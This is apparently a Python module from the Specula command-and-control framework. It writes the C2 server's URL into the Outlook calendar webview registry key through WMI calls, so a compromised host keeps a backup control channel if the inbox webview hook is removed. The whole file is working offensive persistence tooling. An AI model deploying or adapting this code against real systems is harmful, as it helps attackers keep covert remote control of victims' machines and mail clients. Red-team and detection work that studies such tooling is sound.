from lib.core.specmodule import SpecModule
from lib.modhandlers.generic import quotedstring


class Spec(SpecModule):
    def __init__(self, templatepath, helpers):
        self.options = {}
        self.helpers = helpers
        self.help = """
        This module finds the current URL in use for C2 and sets it to the calendar webview.
        The purpose is that this can be used to configure a backup channel incase the inbox webview is deleted.

        It uses WbemScripting.SWbemLocator
        - ConnectServer(root\cimv2)
        - ConnectServer(root\cimv2).CreateKey
        - ConnectServer(root\cimv2).SetStringValue
        - ConnectServer(root\cimv2).SetDWORDValue

        """
        self.entry = 'set_calendarhomepagehook'
        self.depends = ['./helperFunctions/Setregvalue_hkcu.txt']
        self.options['homepageurl'] = {
            "value": "None",
            "required": True,
            "description": """"
            URL to Specula server. Will be set to HKCU\\software\\microsoft\\office\\version\\outlook\\webview\\calendar - URL reg_sz. 
            If set to None it autoresolves to the current URL in use on this Specula server. 
            If you want to use another Specula server as backup define the url to it here.
            """,
            "handler": quotedstring,
            "hidden": False
        }
        super().__init__(templatepath)
    
    def preprocess(self, agent):
        if self.options['homepageurl']['value'] == "None":
            self.options['homepageurl']['value'] = agent.url
